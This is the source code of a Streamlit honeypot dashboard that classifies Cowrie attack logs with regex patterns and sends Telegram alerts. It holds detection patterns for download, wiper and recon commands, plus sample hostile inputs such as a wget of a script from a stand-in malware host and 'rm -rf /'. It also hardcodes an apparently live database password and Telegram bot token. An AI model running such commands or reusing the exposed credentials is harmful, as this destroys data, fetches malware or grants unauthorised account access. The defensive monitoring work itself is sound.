import streamlit as st
import pandas as pd
import psycopg2
from psycopg2.extras import RealDictCursor
import json
import requests
from confluent_kafka import Consumer, KafkaError
import networkx as nx
from pyvis.network import Network
import streamlit.components.v1 as components
import tempfile
import os
import re
from datetime import datetime, timedelta

# --- Configuration ---
DB_HOST = "aws-0-ap-southeast-1.pooler.supabase.com"
DB_NAME = "postgres"
DB_USER = "postgres.ypsdflhceqxrjwyxvclr"
DB_PASS = "Serigala76!"
DB_PORT = 5432

KAFKA_BROKER = "10.0.2.15:9092"
KAFKA_GROUP = "streamlit_consumer_group"
KAFKA_TOPIC = "cowrie_logs"

TELEGRAM_TOKEN = "8083560973:AAGoQstYrKVGVSIincqQ3r_MyGvurDVtNMo"
TELEGRAM_CHAT_ID = "623056896"

# --- Enhanced Detection Patterns ---
MALWARE_PATTERNS = [
    r"wget\s+(https?|ftp)://",
    r"curl\s+(https?|ftp)://",
    r"\.(sh|bin|exe|py|js)\s*$"
]

WIPER_PATTERNS = [
    r"rm\s+-rf",
    r"dd\s+if=/dev/",
    r":\(\)\{:\|:\&\};:",
    r"mv\s+/dev/null",
    r">\s+/dev/sd[a-z]"
]

RECON_PATTERNS = [
    r"cat\s+/etc/passwd",
    r"uname\s+-a",
    r"whoami",
    r"busybox",
    r"nmap",
    r"ping\s+-t",
    r"ss\s+-tuln"
]

BRUTE_FORCE_THRESHOLD = 5  # Failed login attempts to trigger alert

# --- Enhanced Functions ---

def send_telegram_alert(alert_data):
    """Improved alerting with attack-specific details"""
    emoji = {
        "Brute Force": "🔐",
        "Malware": "🦠",
        "Wiper": "💥",
        "Recon": "🕵️"
    }.get(alert_data.get("attack_type"), "⚠️")
    
    message = (
        f"{emoji} <b>GraphPot Alert: {alert_data.get('attack_type', 'Security Event')}</b>\n\n"
        f"<b>Source IP:</b> {alert_data.get('src_ip', 'N/A')}\n"
        f"<b>Target:</b> {alert_data.get('dst_port', 'N/A') or alert_data.get('target', 'N/A')}\n"
        f"<b>Timestamp:</b> {alert_data.get('timestamp', datetime.now().isoformat())}\n"
        f"<b>Evidence:</b> <code>{alert_data.get('evidence', 'N/A')[:200]}</code>"
    )
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        )
    except Exception as e:
        st.error(f"Telegram alert failed: {str(e)}")

@st.cache_resource
def get_db_connection():
    """Enhanced connection with retries"""
    return psycopg2.connect(
        host=DB_HOST,
        dbname=DB_NAME,
        user=DB_USER,
        password=DB_PASS,
        port=DB_PORT,
        cursor_factory=RealDictCursor,
        sslmode='require'
    )

def detect_attack_type(log_entry):
    """Enhanced multi-layer attack detection"""
    eventid = log_entry.get('eventid', '').lower()
    message = str(log_entry.get('message', '')).lower()
    input_cmd = str(log_entry.get('input', '')).lower()
    src_ip = log_entry.get('src_ip')
    
    # Layer 1: Event-based detection
    if eventid == 'cowrie.login.failed':
        # Layer 2: Brute-force pattern
        if int(log_entry.get('attempt_count', 0)) >= BRUTE_FORCE_THRESHOLD:
            return "Brute Force Attack", f"Multiple failed logins ({log_entry.get('attempt_count')} attempts)"
    
    elif eventid == 'cowrie.command.input':
        # Layer 3: Pattern matching
        for pattern in WIPER_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Wiper Attack", f"Detected command: {input_cmd[:50]}..."
                
        for pattern in MALWARE_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Malware Download", f"Download attempt: {input_cmd[:50]}..."
                
        for pattern in RECON_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Reconnaissance", f"Recon command: {input_cmd[:50]}..."
    
    elif eventid == 'cowrie.session.connect':
        # Port scan detection
        if log_entry.get('dst_port'):
            return "Port Scanning", f"Connection to port {log_entry.get('dst_port')}"
    
    # Default classification
    return "Suspicious Activity", message[:100]

def load_attack_data(hours=24):
    """Load data with time-based filtering"""
    conn = get_db_connection()
    query = """
        SELECT *, 
               COUNT(*) OVER (PARTITION BY src_ip, eventid) as attempt_count
        FROM hornet7_data 
        WHERE timestamp >= NOW() - INTERVAL '%s hours'
        ORDER BY timestamp DESC
    """ % hours
    return pd.read_sql(query, conn)

def generate_attack_graph(attack_df):
    """Enhanced visualization with attack-specific nodes"""
    G = nx.DiGraph()
    
    for _, row in attack_df.iterrows():
        src_ip = row.get('src_ip')
        if not src_ip:
            continue
            
        attack_type, details = detect_attack_type(row)
        color = {
            "Brute Force Attack": "#FF6B6B",
            "Wiper Attack": "#FF0000",
            "Malware Download": "#FFA500",
            "Reconnaissance": "#ADD8E6"
        }.get(attack_type, "#888888")
        
        G.add_node(src_ip, label=f"Attacker\n{src_ip}", color=color, shape="box")
        
        target = f"{attack_type}\n{row.get('dst_port', '')}"
        G.add_node(target, label=target, color="#F0F0F0", shape="ellipse")
        G.add_edge(src_ip, target, label=details[:30], color=color)
    
    return G

# --- Streamlit UI ---
st.set_page_config(page_title="GraphPot Threat Dashboard", layout="wide")
st.title("🛡️ GraphPot Threat Dashboard")

# Sidebar filters
with st.sidebar:
    st.header("Filters")
    hours = st.slider("Time window (hours)", 1, 72, 24)
    attack_types = st.multiselect(
        "Attack types",
        ["Brute Force", "Malware", "Wiper", "Reconnaissance"],
        default=["Brute Force", "Wiper"]
    )

# Main dashboard
tab1, tab2, tab3 = st.tabs(["Threat Overview", "Attack Details", "Live Monitoring"])

with tab1:
    st.header("Threat Landscape")
    
    # Load and classify data
    df = load_attack_data(hours)
    df[['attack_type', 'attack_details']] = df.apply(
        lambda x: detect_attack_type(x), 
        axis=1, 
        result_type="expand"
    )
    
    # Filter by selected attack types
    if attack_types:
        df = df[df['attack_type'].isin(attack_types)]
    
    # Metrics
    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Brute Force", df[df['attack_type'] == "Brute Force Attack"].shape[0], delta="High Risk")
    col2.metric("Malware", df[df['attack_type'] == "Malware Download"].shape[0])
    col3.metric("Wiper", df[df['attack_type'] == "Wiper Attack"].shape[0], delta="Critical")
    col4.metric("Recon", df[df['attack_type'] == "Reconnaissance"].shape[0])
    
    # Attack graph
    st.subheader("Attack Pattern Visualization")
    G = generate_attack_graph(df)
    
    net = Network(height="600px", width="100%", directed=True)
    net.from_nx(G)
    
    with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
        net.save_graph(tmp_file.name)
        components.html(open(tmp_file.name, 'r', encoding='utf-8').read(), height=650)
    os.unlink(tmp_file.name)

with tab2:
    st.header("Detailed Attack Logs")
    
    # Enhanced data display
    st.dataframe(
        df[['timestamp', 'src_ip', 'attack_type', 'attack_details', 'dst_port']]
        .sort_values('timestamp', ascending=False)
        .style.applymap(lambda x: "background-color: #FFCCCC" if x == "Wiper Attack" else "", 
                      subset=['attack_type']),
        use_container_width=True
    )
    
    # Attack statistics
    st.subheader("Attack Statistics")
    st.bar_chart(df['attack_type'].value_counts())

with tab3:
    st.header("Real-time Monitoring")
    
    if st.button("Start Live Capture"):
        kafka_placeholder = st.empty()
        
        # Simulate live updates (replace with actual Kafka consumer)
        sample_attacks = [
            {"src_ip": "192.168.1.10", "eventid": "cowrie.login.failed", "attempt_count": 6},
            {"src_ip": "10.0.0.5", "eventid": "cowrie.command.input", "input": "wget http://malware.com/virus.sh"},
            {"src_ip": "172.16.0.3", "eventid": "cowrie.command.input", "input": "rm -rf /"}
        ]
        
        for attack in sample_attacks:
            attack_type, details = detect_attack_type(attack)
            kafka_placeholder.info(f"🚨 {attack_type} detected from {attack['src_ip']}: {details}")
            
            # Send alert
            send_telegram_alert({
                "attack_type": attack_type,
                "src_ip": attack['src_ip'],
                "evidence": attack.get('input', ''),
                "timestamp": datetime.now().isoformat()
            })
            
            # Small delay for demo effect
            import time
            time.sleep(2)

# Auto-refresh every 60 seconds
st_autorefresh(interval=60000, key="data_refresh")
